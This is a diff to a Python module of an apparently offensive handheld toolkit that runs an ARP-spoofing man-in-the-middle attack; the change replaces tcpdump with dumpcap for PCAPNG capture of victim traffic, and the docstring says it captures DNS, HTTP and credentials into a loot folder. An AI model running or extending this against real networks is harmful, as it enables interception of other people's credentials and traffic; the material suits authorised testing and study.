@@ -1,8 +1,8 @@
 """MITM — ARP spoofing man-in-the-middle attack.
 
 Ported from JanOS. Poisons ARP caches to intercept traffic between
-victim(s) and the gateway. Captures DNS/HTTP/credentials live + pcap.
-Runs entirely on the uConsole (scapy + tcpdump), does NOT use ESP32 serial.
+victim(s) and the gateway. Captures DNS/HTTP/credentials live + PCAPNG.
+Runs entirely on the uConsole (scapy + dumpcap), and does not use ESP32 serial.
 """
 
 import os
@@ -24,7 +24,7 @@ class MITMAttack:
         self._running = False
         self._spoof_thread: threading.Thread | None = None
         self._sniff_thread: threading.Thread | None = None
-        self._tcpdump_proc: subprocess.Popen | None = None
+        self._capture_proc: subprocess.Popen | None = None
         self._pcap_path = ""
         self._iface = ""
         self._gateway_ip = ""
@@ -269,37 +269,37 @@ class MITMAttack:
             if self._running:
                 self._msg(f"[MITM] Sniffer error: {e}")
 
-    # -- tcpdump --
+    # -- PCAPNG capture --
 
-    def _start_tcpdump(self) -> None:
+    def _start_capture(self) -> None:
         if not self._loot:
             return
         mitm_dir = os.path.join(self._loot.session_path, "mitm")
         os.makedirs(mitm_dir, exist_ok=True)
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-        self._pcap_path = os.path.join(mitm_dir, f"capture_{ts}.pcap")
+        self._pcap_path = os.path.join(mitm_dir, f"capture_{ts}.pcapng")
         victim_filter = " or ".join(f"host {ip}" for ip, _ in self._victims)
         try:
-            self._tcpdump_proc = subprocess.Popen(
-                ["tcpdump", "-i", self._iface, "-w", self._pcap_path,
-                 "-s", "0", victim_filter],
+            self._capture_proc = subprocess.Popen(
+                ["dumpcap", "-q", "-n", "-i", self._iface,
+                 "-w", self._pcap_path, "-s", "0", "-f", victim_filter],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            self._msg(f"[MITM] tcpdump -> {self._pcap_path}")
+            self._msg(f"[MITM] dumpcap PCAPNG -> {self._pcap_path}")
         except FileNotFoundError:
-            self._msg("[MITM] tcpdump not found")
-            self._tcpdump_proc = None
+            self._msg("[MITM] dumpcap not found")
+            self._capture_proc = None
 
-    def _stop_tcpdump(self) -> None:
-        if self._tcpdump_proc:
+    def _stop_capture(self) -> None:
+        if self._capture_proc:
             try:
-                self._tcpdump_proc.terminate()
-                self._tcpdump_proc.wait(timeout=5)
+                self._capture_proc.terminate()
+                self._capture_proc.wait(timeout=5)
             except Exception:
                 try:
-                    self._tcpdump_proc.kill()
+                    self._capture_proc.kill()
                 except Exception:
                     pass
-            self._tcpdump_proc = None
+            self._capture_proc = None
 
     # -- Start / stop --
 
@@ -349,7 +349,7 @@ class MITMAttack:
         self._running = True
         self.packets = 0
         self._enable_ip_forward()
-        self._start_tcpdump()
+        self._start_capture()
 
         self._spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
         self._spoof_thread.start()
@@ -372,7 +372,7 @@ class MITMAttack:
         self._running = False
         self._msg("[MITM] Stopping...")
         self._restore_arp()
-        self._stop_tcpdump()
+        self._stop_capture()
         self._restore_ip_forward()
 
         if self._spoof_thread:
